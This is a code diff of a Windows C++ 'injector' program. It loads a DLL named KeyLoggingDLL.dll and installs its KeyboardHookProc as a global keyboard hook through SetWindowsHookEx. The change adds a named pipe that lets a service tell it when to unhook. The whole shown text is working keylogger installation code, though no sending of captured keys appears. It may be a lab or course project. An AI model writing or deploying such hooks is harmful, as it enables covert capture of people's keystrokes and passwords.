@@ -1,16 +1,11 @@
 #include <stdio.h>
-#include <iostream>
-
+#include <tchar.h>
 #include <windows.h>
-#include <tlhelp32.h>
 #include <psapi.h>
-#include <string.h>
 
 #define no_init_all deprecated
+#define pipeName _T("\\\\.\\pipe\\pipeToInjector")
 
-
-
- 
 void _printf(const char* format, ...)
 {
 	char msg[100];
@@ -23,16 +18,22 @@ void _printf(const char* format, ...)
 	size_t size = strlen(msg) + 1;
 	mbstowcs_s(&outsize, wmsg, size, msg, size - 1);
 	OutputDebugString(wmsg);
-
 }
+
 int main()
 {
+	_printf("In injector\n");
+	
 	HMODULE dll;
 	HHOOK hook;
 	HOOKPROC hookproc;
+	char buffer[1024];
+	DWORD dwRead;
+	
+	HANDLE hPipe = CreateFile(pipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 	const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
-	_printf("In injector\n");
 	dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
+
 	if (dll)
 	{
 		hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
@@ -42,12 +43,13 @@ int main()
 			hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);
 			if (hook)
 			{
-				while (1)
+				// block until the service send message to unhook
+				while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead != 0)
 				{
-					Sleep(1000);
+					buffer[dwRead] = '\0';
+					UnhookWindowsHookEx(hook);
+					CloseHandle(hPipe);
 				}
-				_printf("Out");
-				UnhookWindowsHookEx(hook);
 			}
 			else
 			{
